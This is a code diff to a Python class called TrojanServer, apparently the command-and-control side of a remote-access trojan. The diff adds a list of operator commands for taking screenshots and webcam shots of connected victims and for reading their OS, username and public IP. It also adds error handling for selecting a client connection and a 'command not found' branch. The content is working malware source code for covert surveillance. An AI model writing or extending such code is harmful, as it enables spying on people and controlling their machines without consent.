@@ -21,6 +21,7 @@ class TrojanServer(object):
             threading.Thread(target=self.client_conn, name=ipstr, args=(client,address)).start()
     
     def client_conn(self,client, address):
+        list_of_commands=["show clients","show os","show global ip","show username","make screenshot","make cam shot","exit client","help"]
         while True:
             ipstr= address[0] + ":" + str(address[1]) + " >> "
             cmd = ""
@@ -35,10 +36,14 @@ class TrojanServer(object):
                     print(t.getName())
             
             elif cmd.lower().startswith("useconn"):
-                tmp = cmd.split(" ")
-                for t in threading.enumerate():
-                    if (t.getName() == tmp[1].strip()):
-                        t.join()
+                try:
+                    tmp = cmd.split(" ")
+                    for t in threading.enumerate():
+                        if (t.getName() == tmp[1].strip()):
+                            t.join()
+                except RuntimeError:
+                    print("is already in use")
+                    continue
             
             ### HELP ###
             elif cmd.lower() == "help" or cmd.lower() == "?":
@@ -55,6 +60,11 @@ class TrojanServer(object):
                 print("exit client          - closes the connection from the client")
                 print("help                 - Show all commands and options")
                 print()
+            
+            # Put all commands here!
+            elif not cmd.lower() in list_of_commands:
+                print("command not found")
+                continue
 
             ### SEND ###
             else:
